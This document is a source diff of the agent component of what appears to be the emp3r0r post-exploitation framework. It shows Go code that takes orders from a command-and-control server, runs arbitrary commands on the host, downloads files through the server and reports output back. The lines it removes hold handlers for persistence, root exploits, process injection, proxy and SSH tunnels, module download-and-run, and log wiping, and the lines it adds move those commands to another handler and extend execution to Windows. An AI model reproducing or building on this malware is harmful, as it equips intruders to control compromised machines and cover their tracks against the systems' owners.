@@ -1,14 +1,12 @@
 package agent
 
-// build +linux
-
 import (
-	"context"
-	"encoding/json"
+	"bytes"
 	"fmt"
 	"log"
 	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -22,14 +20,13 @@ import (
 // exec cmd, receive data, etc
 func processCCData(data *emp3r0r_data.MsgTunData) {
 	var (
-		data2send   emp3r0r_data.MsgTunData
-		out         string
-		outCombined []byte
-		err         error
+		data2send emp3r0r_data.MsgTunData
+		out       string
+		err       error
 	)
-	data2send.Tag = emp3r0r_data.AgentTag
+	data2send.Tag = RuntimeConfig.AgentTag
 
-	payloadSplit := strings.Split(data.Payload, emp3r0r_data.OpSep)
+	payloadSplit := strings.Split(data.Payload, emp3r0r_data.MagicString)
 	if len(payloadSplit) <= 1 {
 		log.Printf("Cannot parse CC command: %s, wrong OpSep maybe?", data.Payload)
 		return
@@ -37,24 +34,39 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	cmd_id := payloadSplit[len(payloadSplit)-1]
 
 	// command from CC
-	cmdSlice := strings.Fields(payloadSplit[1])
+	keep_running := strings.HasSuffix(payloadSplit[1], "&") // ./program & means keep running in background
+	cmd_str := strings.TrimSuffix(payloadSplit[1], "&")
+	cmdSlice := util.ParseCmd(cmd_str)
 
 	// send response to CC
 	sendResponse := func(resp string) {
 		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
-			emp3r0r_data.OpSep,
+			emp3r0r_data.MagicString,
 			strings.Join(cmdSlice, " "),
-			emp3r0r_data.OpSep,
+			emp3r0r_data.MagicString,
 			out)
-		data2send.Payload += emp3r0r_data.OpSep + cmd_id // cmd_id for cmd tracking
+		data2send.Payload += emp3r0r_data.MagicString + cmd_id // cmd_id for cmd tracking
 		if err = Send2CC(&data2send); err != nil {
 			log.Println(err)
 		}
 	}
 
 	// # shell helpers
+	// previously there was a dedicated "shell", now it is integrated
+	// with the main command prompt, you can execute these commands directly
+	// by typing them in emp3r0r console
 	if strings.HasPrefix(cmdSlice[0], "#") {
 		out = shellHelper(cmdSlice)
+		sendResponse(out)
+		return
+	}
+
+	// ! C2Commands
+	/*
+	   !command: special commands (not sent by user)
+	*/
+	if strings.HasPrefix(cmdSlice[0], "!") {
+		out = C2CommandsHandler(cmdSlice)
 		sendResponse(out)
 		return
 	}
@@ -78,9 +90,9 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		}
 
 		// move to agent root
-		err = os.Rename(out, emp3r0r_data.AgentRoot+"/"+out)
+		err = os.Rename(out, RuntimeConfig.AgentRoot+"/"+out)
 		if err == nil {
-			out = emp3r0r_data.AgentRoot + "/" + out
+			out = RuntimeConfig.AgentRoot + "/" + out
 		}
 
 		// tell CC where to download the file
@@ -91,7 +103,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
 			return
 		}
-		err = os.RemoveAll(emp3r0r_data.AgentRoot)
+		err = os.RemoveAll(RuntimeConfig.AgentRoot)
 		if err != nil {
 			log.Fatalf("Failed to cleanup files")
 		}
@@ -213,17 +225,17 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			return
 		}
 
-		url := fmt.Sprintf("%swww/%s", emp3r0r_data.CCAddress, cmdSlice[1])
+		file_to_download := cmdSlice[1]
 		path := cmdSlice[2]
 		size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
 		if err != nil {
-			out = fmt.Sprintf("processCCData: cant get size of %s: %v", url, err)
+			out = fmt.Sprintf("processCCData: cant get size of %s: %v", file_to_download, err)
 			sendResponse(out)
 			return
 		}
-		_, err = DownloadViaCC(url, path)
+		_, err = DownloadViaCC(file_to_download, path)
 		if err != nil {
-			out = fmt.Sprintf("processCCData: cant download %s: %v", url, err)
+			out = fmt.Sprintf("processCCData: cant download %s: %v", file_to_download, err)
 			sendResponse(out)
 			return
 		}
@@ -238,281 +250,47 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		sendResponse(out)
 
-		/*
-		   !command: special commands (not sent by user)
-		*/
-		// stat file
-	case "!stat":
-		if len(cmdSlice) < 2 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-
-		path := cmdSlice[1]
-		fi, err := os.Stat(path)
-		if err != nil || fi == nil {
-			out = fmt.Sprintf("cant stat file %s: %v", path, err)
-			sendResponse(out)
-			return
-		}
-		fstat := &util.FileStat{}
-		fstat.Name = util.FileBaseName(path)
-		fstat.Size = fi.Size()
-		fstat.Checksum = tun.SHA256SumFile(path)
-		fstat.Permission = fi.Mode().String()
-		fiData, err := json.Marshal(fstat)
-		out = string(fiData)
-		if err != nil {
-			out = fmt.Sprintf("cant marshal file info %s: %v", path, err)
-		}
-		sendResponse(out)
-
-	case "!" + emp3r0r_data.ModREVERSEPROXY:
-		// reverse proxy
-		if len(cmdSlice) != 2 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		addr := cmdSlice[1]
-		out = "Reverse proxy for " + addr + " finished"
-
-		hasInternet := tun.HasInternetAccess()
-		isProxyOK := tun.IsProxyOK(emp3r0r_data.AgentProxy)
-		if !hasInternet && !isProxyOK {
-			out = "We dont have any internet to share"
-		}
-		for p, cancelfunc := range ReverseConns {
-			if addr == p {
-				cancelfunc() // cancel existing connection
-			}
-		}
-		addr += ":" + emp3r0r_data.ReverseProxyPort
-		ctx, cancel := context.WithCancel(context.Background())
-		if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
-			out = err.Error()
-		}
-		sendResponse(out)
-
-	case "!lpe":
-		// LPE helper
-		// !lpe script_name
-		if len(cmdSlice) < 2 {
-			log.Printf("args error: %s", cmdSlice)
-			out = fmt.Sprintf("args error: %s", cmdSlice)
-			sendResponse(out)
-			return
-		}
-
-		helper := cmdSlice[1]
-		out = lpeHelper(helper)
-		sendResponse(out)
-
-	case "!sshd":
-		// sshd server
-		// !sshd id shell port args
-		log.Printf("Got sshd request: %s", cmdSlice)
-		if len(cmdSlice) < 3 {
-			log.Printf("args error: %s", cmdSlice)
-			out = fmt.Sprintf("args error: %s", cmdSlice)
-			sendResponse(out)
-			return
-		}
-		shell := cmdSlice[1]
-		port := cmdSlice[2]
-		args := cmdSlice[3:]
-		go func() {
-			err = SSHD(shell, port, args)
-			if err != nil {
-				log.Printf("Failed to start SSHD: %v", err)
-			}
-		}()
-		out = "success"
-		for !tun.IsPortOpen("127.0.0.1", port) {
-			time.Sleep(100 * time.Millisecond)
-			if err != nil {
-				out = fmt.Sprintf("sshd failed to start: %v", err)
-				break
-			}
-		}
-		sendResponse(out)
-
-		// proxy server
-	case "!proxy":
-		if len(cmdSlice) != 3 {
-			log.Printf("args error: %s", cmdSlice)
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		log.Printf("Got proxy request: %s", cmdSlice)
-		addr := cmdSlice[2]
-		err = Socks5Proxy(cmdSlice[1], addr)
-		if err != nil {
-			log.Printf("Failed to start Socks5Proxy: %v", err)
-		}
-		return
-
-		// port fwd
-		// cmd format: !port_fwd [to/listen] [shID] [operation]
-	case "!port_fwd":
-		if len(cmdSlice) != 4 {
-			log.Printf("Invalid command: %v", cmdSlice)
-			return
-		}
-		switch cmdSlice[3] {
-		case "stop":
-			sessionID := cmdSlice[1]
-			pf, exist := PortFwds[sessionID]
-			if exist {
-				pf.Cancel()
-				log.Printf("port mapping %s stopped", pf.Addr)
-				break
-			}
-			log.Printf("port mapping %s not found", pf.Addr)
-		case "reverse":
-			go func() {
-				addr := cmdSlice[1]
-				sessionID := cmdSlice[2]
-				err = PortFwd(addr, sessionID, true)
-				if err != nil {
-					log.Printf("PortFwd (reverse) failed: %v", err)
-				}
-			}()
-		case "on":
-			go func() {
-				to := cmdSlice[1]
-				sessionID := cmdSlice[2]
-				err = PortFwd(to, sessionID, false)
-				if err != nil {
-					log.Printf("PortFwd failed: %v", err)
-				}
-			}()
-		default:
-		}
-
-		return
-
-		// delete_portfwd
-	case "!delete_portfwd":
-		if len(cmdSlice) != 2 {
-			return
-		}
-		for id, session := range PortFwds {
-			if id == cmdSlice[1] {
-				session.Cancel()
-			}
-		}
-		return
-
-		// GDB inject
-	case "!inject":
-		if len(cmdSlice) != 3 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		out = fmt.Sprintf("%s: success", cmdSlice[1])
-		pid, err := strconv.ParseInt(cmdSlice[2], 10, 32)
-		if err != nil {
-			log.Print("Invalid pid")
-		}
-		err = InjectorHandler(int(pid), cmdSlice[1])
-		if err != nil {
-			out = "failed: " + err.Error()
-		}
-		sendResponse(out)
-
-		// download utils
-	case "!utils":
-		out = VaccineHandler()
-		sendResponse(out)
-
-		// download a module and run it
-	case "!custom_module":
-		if len(cmdSlice) != 3 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		out = moduleHandler(cmdSlice[1], cmdSlice[2])
-		sendResponse(out)
-
-		// persistence
-	case "!persistence":
-		if len(cmdSlice) != 2 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		out = "Success"
-		SelfCopy()
-		if cmdSlice[1] == "all" {
-			err = PersistAllInOne()
-			if err != nil {
-				log.Print(err)
-				out = fmt.Sprintf("Result: %v", err)
-			}
-		} else {
-			out = "No such method available"
-			if method, exists := PersistMethods[cmdSlice[1]]; exists {
-				out = "Success"
-				err = method()
-				if err != nil {
-					log.Println(err)
-					out = fmt.Sprintf("Result: %v", err)
-				}
-			}
-		}
-		sendResponse(out)
-
-		// get_root
-	case "!get_root":
-		if os.Geteuid() == 0 {
-			out = "You already have root!"
-		} else {
-			err = GetRoot()
-			out = fmt.Sprintf("LPE exploit failed:\n%v", err)
-			if err == nil {
-				out = "Got root!"
-			}
-		}
-		sendResponse(out)
-
-		// upgrade
-	case "!upgrade_agent":
-		if len(cmdSlice) != 2 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-
-		out = "Done"
-		checksum := cmdSlice[1]
-		err = Upgrade(checksum)
-		if err != nil {
-			out = err.Error()
-		}
-		sendResponse(out)
-
-		// log cleaner
-	case "!clean_log":
-		if len(cmdSlice) != 2 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
-		}
-		keyword := cmdSlice[1]
-		out = "Done"
-		err = CleanAllByKeyword(keyword)
-		if err != nil {
-			out = err.Error()
-		}
-		sendResponse(out)
-
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
-		cmd := exec.Command(emp3r0r_data.DefaultShell, "-c", strings.Join(cmdSlice, " "))
-		outCombined, err = cmd.CombinedOutput()
+		if runtime.GOOS != "linux" {
+			if !strings.HasSuffix(cmdSlice[0], ".exe") {
+				cmdSlice[0] += ".exe"
+			}
+		}
+		cmd := exec.Command(cmdSlice[0], cmdSlice[1:]...)
+		var out_bytes []byte
+		out_buf := bytes.NewBuffer(out_bytes)
+		cmd.Stdout = out_buf
+		cmd.Stderr = out_buf
+		err = cmd.Start()
 		if err != nil {
 			log.Println(err)
-			outCombined = []byte(fmt.Sprintf("%s\n%v", outCombined, err))
+			out = fmt.Sprintf("%s\n%v", out_buf.Bytes(), err)
+		} else {
+			// kill process after 10 seconds
+			// except when & is appended
+			if !keep_running {
+				cmd.Wait()
+			}
+			go func() {
+				for i := 0; i < 10; i++ {
+					time.Sleep(time.Second)
+				}
+				if !keep_running && util.IsPIDAlive(cmd.Process.Pid) {
+					err = cmd.Process.Kill()
+					out = fmt.Sprintf("Killing %d, which has been running for more than 10s, status %v",
+						cmd.Process.Pid, err)
+					sendResponse(out)
+					return
+				}
+			}()
+		}
+		out = out_buf.String()
+		if keep_running {
+			out = fmt.Sprintf("%s running in background, PID is %d",
+				cmdSlice, cmd.Process.Pid)
 		}
 
-		out = string(outCombined)
 		sendResponse(out)
 	}
 }
